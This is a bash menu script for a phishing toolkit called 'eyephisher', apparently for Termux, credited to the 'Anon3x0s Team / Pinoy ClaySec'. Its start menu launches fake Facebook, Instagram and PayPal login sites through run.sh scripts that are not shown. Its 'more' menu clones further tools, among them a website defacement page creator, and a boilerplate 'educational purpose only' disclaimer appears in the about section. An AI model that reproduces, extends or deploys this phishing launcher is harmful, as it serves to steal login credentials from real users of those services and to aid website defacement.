#---------Created By Anon3x0s Team / Pinoy ClaySec---------#
#---------Simple phishing site :)---------#


#---------colors
r='\e[1;31m'
g='\e[1;32m'
y='\e[1;33m'
b='\e[1;34m'
p='\e[1;35m'
c='\e[1;36m'
w='\e[1;37m'


#---------banner
banner (){
	clear
	sleep 2
	echo
	echo
	echo -e "  $r              ███████╗██╗   ██╗███████╗"
echo -e "                ██╔════╝╚██╗ ██╔╝██╔════╝"
echo -e "                █████╗   ╚████╔╝ █████╗  "
echo -e "                ██╔══╝    ╚██╔╝  ██╔══╝  "
echo -e "                ███████╗   ██║   ███████╗"
echo -e "                ╚══════╝   ╚═╝   ╚══════╝"

echo -e "    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ "
echo -e "    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗"
echo -e "    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝"
echo -e "    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗"
echo -e "    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║"
echo -e "    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      "
echo -e "           $g[$w~$g]$c Tool Created by Anon3x0s Team $g[$w~$g]"

	echo
	echo
}

#---------menu
menu (){
	echo -e "       \033[31m[\033[37m01\033[31m]\e[93m START  \033[31m[\033[37m02\033[31m]\e[93m ABOUT  \033[31m[\033[37m03\033[31m]\e[93m MORE  \033[31m[\033[37m00\033[31m]\e[93m EXIT"
	echo
	echo -ne " $r[$w+$r]$g Select Option $w: "
	read input
	if [[ "$input" == "1" || "$input" == "01" ]];
	then
		start
	elif [[ "$input" == "2" || "$input" == "02" ]];
        then
                about
	elif [[ "$input" == "3" || "$input" == "03" ]];
        then
                more
	elif [[ "$input" == "0" || "$input" == "00" ]];
        then
		sleep 1
		echo
        	exit 1
	else
		echo -e " $r[$w!$r] Wrong Typed Please Try Again!!!"
		echo
		exit 1
	fi
	}


#---------start page
start (){
	echo
	clear
	sleep 1
	banner
	echo -e "    $r[\033[37m01$r]$y Facebook  $r[\033[37m02$r]$y Instagram  $r[\033[37m03$r]$y Paypal  $r[\033[37m00$r]$y Back"
	echo
	echo -ne " $r[$w+$r]$g Select Option $w: "
	read inpu
	if [[ "$inpu" == "1" || "$inpu" == "01" ]];
	then
		cd $HOME/eyephisher/sites/facebook
		bash run.sh
	elif [[ "$inpu" == "2" || "$inpu" == "02" ]];
	then
		cd $HOME/eyephisher/sites/insta
		bash run.sh
	elif [[ "$inpu" == "3" || "$inpu" == "03" ]];
	then
		cd $HOME/eyephisher/sites/paypal
		bash run.sh
	elif [[ "$inpu" == "0" || "$inpu" == "00" ]];
	then
		bash eyephisher.sh
	else
		echo -e " $r[$w!$r] Wrong Typed Please Try Again!!!"
		echo
		exit 1
     fi
}


#---------about
about (){
	echo
	clear
	sleep 1
	banner
	echo -e "   $r[$w+\033[31m]$g ABOUT $w: $g"
	echo
	sleep 0.2
	echo -e "  This tool created by R3X SKIDS/Terrius punk, C0d3py and also Pinoy "
	echo -e "  ClaySec members. "
	echo
	echo
	sleep 0.2
	echo -e "   $r[$w+$r]$g DISCLAIMER $w: $g "
	echo
	echo -e "  This tool is created for educational purpose only."
	echo -e "  The tool creator is in no way responsible for. "
	echo -e "  any misuse of the tool provided."
	echo
	echo
	sleep 0.2
	echo -e "   $r[$w+$r]$g Social Medias $w: $g "
	echo
	echo -e "  \033[31m[\034[37m~\033[31]\033[32m Facebook $w:$g https://www.facebook.com/T3rr8usP4nk/"
	echo -e "  \033[31m[\034[37m~\033[31]\033[32m Github $w:$g http://github.com/T3rr8us-P4nk"
	echo -e "  \033[31m[\034[37m~\033[31]\033[32m Youtube $w:$g https://m.youtube.com/channel/UC1IA5cyRUEze3lRzw-PQCBg"
	echo
	sleep 0.2
	echo -e "   $r[$w+$r]$g Greetings & Credit $w: $g "
	echo -e "  L3nc3$w -$g Fl3mc3$w -$g C0d3py$w -$g GrinXz$w -$g S4SHZ-X$w -$g PINOY CLAYSEC$w -$g AND ALL OF MY MASTERS"
	echo
}



#---------more
more (){
	echo
	clear
	sleep 1
	banner
	echo
	echo -e " $r[$w+$r]$g More $w: "
	echo
	echo -e " $r[$w+$r]$g Install our tool $w: "
	echo
	echo -e " $r[\033[37m01$r]$y Pyr4-Tool  $r[\033[37m02$r]$y Deface_Page_Creator $r[\033[37m03$r]$y TCT App "
	echo
	echo -ne " $r[$w+$r]$g Select Option $w: "
	read more
	if [[ "$more" == "1" || "$more" == "01" ]];
	then
		sleep 1
		echo -e "$w Pyr4-Tool is a tool which helps you to install tools in one click "
		sleep 2
		echo
		cd $HOME
		apt update && apt upgrade -y
		apt install git
		apt install python
		git clone https://github.com/T3rr8us-P4nk/pyra-Installer
		sleep 1
		exit 1
	elif [[ "$more" == "2" || "$more" == "02" ]];
	then
		sleep 1
		echo -e "$w Deface_Page_Creator is tool which helps you to make a deface page using a tool and easy way "
		sleep 2
		echo
		cd $HOME
		apt update && apt upgrade -y
                apt install git
                apt install python
		git clone http://github.com/T3rr8us-P4nk/Deface_page_creator
		sleep 1
		exit 1
	elif [[ "$more" == "3" || "$more" == "03" ]];
	then
		sleep 1
		echo -e "$w TCT app is an app which helps you/user to know more about Termux "
		sleep 1
		am start -a android.intent.action.VIEW -d https://github.com/T3rr8us-P4nk/TCT-app
	else
		echo -e " $r[$w!$r] Wrong Typed Please Try Again!!!"
		echo
		exit 1
	fi
}


banner
menu
